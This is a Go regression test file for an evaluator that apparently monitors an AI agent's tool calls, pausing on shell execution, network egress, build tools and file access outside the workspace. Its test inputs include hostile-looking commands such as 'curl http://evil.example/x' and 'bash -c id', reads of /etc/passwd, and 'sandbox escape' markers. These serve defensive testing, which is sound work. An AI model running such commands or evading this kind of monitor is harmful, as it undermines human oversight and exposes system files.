package capability

import (
	"context"
	"errors"
	"testing"
)

// Rev 15 regression tests — reviewer run 200 (two reproducible P2 defects).
//
// Finding 1: exact canonical shell/network tokens in arbitrary benign
// argument content triggered boundary signals and fail-closed pauses because
// extraction scanned EVERY arg value. `write_file` with `content:"shell"`,
// `content:"bash"`, or `content:"curl"` emitted boundary signals and Eval
// failed closed (false PAUSE). This is the SECOND occurrence of the SAME
// failure class as reviewer run 191 (substring "crash"/"bashful" in
// `content`). Per Mayur's whack-a-mole rule (AGENTS.md), the parent
// condition is eliminated: boundary-signal extraction is now
// COMMAND-BEARING-KEY-AWARE — only `command`/`cmd`/`args`/`arguments`/
// `executable`/`shell_command` arg values are scanned for command
// invocations. Non-command keys (`content`, `path`, `url`, `output`, ...)
// are ordinary payload and never produce boundary/build signals.
//
// Finding 2: explicit file access with a lexically outside path plus a
// nonexistent workspace root was classified as ordinary E5 instead of
// evaluator_error because `PathOutsideWorkspace` returned (true, nil) for a
// lexical-outside path before resolving the workspace root. The root is now
// resolved BEFORE lexical classification; a missing/nonexistent root is an
// evaluator error → PAUSE.

// Reviewer's exact finding-1 cases: canonical tokens in benign payload under
// a NON-command key must NOT emit boundary signals and must NOT fail closed.
func TestRev15BenignPayloadExactTokensNoFalsePause(t *testing.T) {
	cases := []struct {
		name    string
		content string
	}{
		{"shell", "shell"},
		{"bash", "bash"},
		{"curl", "curl"},
		{"sh", "sh"},
		{"wget", "wget"},
		{"http-url", "https://evil.example/x"},
		{"bash-c", "bash -c id"},
		{"gcc", "gcc -o /tmp/x poc.c"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ws := t.TempDir()
			e, err := NewChainEvaluator("sess-rev15-benign-" + tc.name)
			if err != nil {
				t.Fatal(err)
			}
			r, err := e.Eval(context.Background(), Step{
				SessionID: "sess-rev15-benign-" + tc.name,
				StepID:    1,
				Tool:      "write_file",
				Args:      map[string]string{"content": tc.content},
				Declared:  DeclaredAuthority{Target: "target", WorkspaceRoot: ws},
			}, GenesisPrevHash)
			if err != nil {
				t.Fatalf("benign payload content %q must not fail closed, got %v", tc.content, err)
			}
			if r.Decision != DecisionAllow {
				t.Fatalf("benign payload content %q must ALLOW, got %s", tc.content, r.Decision)
			}
			for _, s := range r.Signals {
				switch s.Kind {
				case SignalBoundaryHostExec, SignalBoundaryEgress, SignalArtifactBuildArtifact:
					t.Fatalf("benign payload content %q emitted boundary/build signal %s — non-command key must not be scanned", tc.content, s.Kind)
				}
			}
		})
	}
}

// Direct unit controls: the non-command key is structurally not scanned.
func TestRev15NonCommandKeyNeverScannedUnit(t *testing.T) {
	if hostExecFromArgs(Step{Tool: "write_file", Args: map[string]string{"content": "bash -c id"}}, "") {
		t.Fatal("hostExecFromArgs must not scan non-command key content")
	}
	if egressFromArgs(Step{Tool: "write_file", Args: map[string]string{"content": "curl http://evil.example/x"}}, "") {
		t.Fatal("egressFromArgs must not scan non-command key content")
	}
	if isBuildToolArgs(Step{Tool: "write_file", Args: map[string]string{"content": "gcc -o out main.c"}}) {
		t.Fatal("isBuildToolArgs must not scan non-command key content")
	}
	// Path-key URLs are still egress surfaces only under the derived-net path;
	// but a pure data `url` value on a generic tool is not a command.
	if egressFromArgs(Step{Tool: "exec", Args: map[string]string{"url": "http://evil.example/x"}}, "") {
		t.Fatal("egressFromArgs must not scan non-command key url on a generic tool")
	}
}

// Positive controls: canonical command-bearing surfaces STILL emit boundary
// signals (no regression of Rev 9/10/11/12 positives).
func TestRev15CommandBearingKeyPositives(t *testing.T) {
	pos := []Step{
		{Tool: "exec", Args: map[string]string{"command": "bash -c id"}},
		{Tool: "exec", Args: map[string]string{"command": "sh -c 'curl http://example.com'"}},
		{Tool: "exec", Args: map[string]string{"command": "curl http://evil.example/x"}},
		{Tool: "exec", Args: map[string]string{"command": "shell -c id"}},
		{Tool: "run", Args: map[string]string{"args": "clang -O2 -o out main.c"}},
		{Tool: "exec", Args: map[string]string{"command": "gcc -o out main.c"}},
		{Tool: "exec", Args: map[string]string{"cmd": "wget https://example.com/x"}},
	}
	for i, step := range pos {
		sigs := ExtractSignals(step)
		if !hasSignal(sigs, SignalBoundaryHostExec) && !hasSignal(sigs, SignalBoundaryEgress) && !hasSignal(sigs, SignalArtifactBuildArtifact) {
			t.Fatalf("positive case %d %+v must emit a boundary/build signal, got %+v", i, step, sigs)
		}
	}
}

// Reviewer's exact finding-2 case: explicit file_access with an outside path
// under a NONEXISTENT workspace root is an evaluator error → PAUSE, never an
// ordinary E5 classification.
func TestRev15ExplicitFileAccessMissingRootFailsClosed(t *testing.T) {
	e, err := NewChainEvaluator("sess-rev15-f2-missing-root")
	if err != nil {
		t.Fatal(err)
	}
	_, err = e.Eval(context.Background(), Step{
		SessionID:    "sess-rev15-f2-missing-root",
		StepID:       1,
		Tool:         "read_file",
		Path:         "/etc/passwd",
		EffectTarget: "/etc/passwd",
		Effect:       EffectFileAccess,
		Declared: DeclaredAuthority{
			Target:        "target",
			WorkspaceRoot: "/does-not-exist-review-root",
		},
	}, GenesisPrevHash)
	if err == nil {
		t.Fatal("explicit file_access outside under nonexistent workspace root must be an evaluator error (fail closed), got nil")
	}
	if !errors.Is(err, ErrInvalidStep) {
		t.Fatalf("must wrap ErrInvalidStep, got %v", err)
	}
}

// Direct unit control: PathOutsideWorkspace itself must error on a
// nonexistent root even for a lexically-outside path.
func TestRev15PathOutsideMissingRootUnit(t *testing.T) {
	_, err := PathOutsideWorkspace("/etc/passwd", "/does-not-exist-review-root")
	if err == nil {
		t.Fatal("PathOutsideWorkspace must error on a nonexistent workspace root even for a lexically-outside path")
	}
	if !errors.Is(err, ErrInvalidStep) {
		t.Fatalf("must wrap ErrInvalidStep, got %v", err)
	}
}

// Control: the SAME shape with a REAL workspace root keeps the ordinary E5
// pause (no regression of explicit file_access outside).
func TestRev15ExplicitFileAccessValidRootStillE5(t *testing.T) {
	ws := t.TempDir()
	e, err := NewChainEvaluator("sess-rev15-f2-valid-root")
	if err != nil {
		t.Fatal(err)
	}
	r, err := e.Eval(context.Background(), Step{
		SessionID:    "sess-rev15-f2-valid-root",
		StepID:       1,
		Tool:         "read_file",
		Path:         "/etc/passwd",
		EffectTarget: "/etc/passwd",
		Effect:       EffectFileAccess,
		Declared: DeclaredAuthority{
			Target:        "target",
			WorkspaceRoot: ws,
		},
	}, GenesisPrevHash)
	if err != nil {
		t.Fatalf("explicit file_access outside under valid root must evaluate (E5 pause), got err %v", err)
	}
	if r.Decision != DecisionPauseRequireProof {
		t.Fatalf("explicit file_access outside must PAUSE (E5), got %s", r.Decision)
	}
}

// Control: empty-Effect file surface under a nonexistent root is STILL the
// Rev 14 untyped fail-closed rule (unchanged by Rev 15).
func TestRev15UntypedFileMissingRootStillFailsClosed(t *testing.T) {
	e, err := NewChainEvaluator("sess-rev15-untyped-missing-root")
	if err != nil {
		t.Fatal(err)
	}
	_, err = e.Eval(context.Background(), Step{
		SessionID:    "sess-rev15-untyped-missing-root",
		StepID:       1,
		Tool:         "read_file",
		Path:         "/etc/passwd",
		EffectTarget: "/etc/passwd",
		Effect:       "",
		Declared: DeclaredAuthority{
			Target:        "target",
			WorkspaceRoot: "/does-not-exist-review-root",
		},
	}, GenesisPrevHash)
	if err == nil {
		t.Fatal("empty-Effect outside file surface under missing root must fail closed, got nil")
	}
}

// Runtime markers remain evidence strings: they STILL scan ALL args (a
// `SIGSEGV`/`landlock` in a mediated tool's output/payload is a marker, not
// a command invocation). Regression control that the Rev 15 key constraint
// did not narrow marker scanning.
func TestRev15RuntimeMarkersStillScanAllArgs(t *testing.T) {
	sigs := ExtractSignals(Step{
		Tool: "write_file",
		Args: map[string]string{"content": "SIGSEGV heap-buffer-overflow"},
	})
	if !hasSignal(sigs, SignalRuntimeMemoryCorruption) {
		t.Fatalf("memory marker in non-command key content must still emit runtime.memory_corruption_marker, got %+v", sigs)
	}
	sigs = ExtractSignals(Step{
		Tool: "write_file",
		Args: map[string]string{"content": "sandbox escape"},
	})
	if !hasSignal(sigs, SignalRuntimeSandboxEscape) {
		t.Fatalf("escape marker in non-command key content must still emit runtime.sandbox_escape_marker, got %+v", sigs)
	}
}
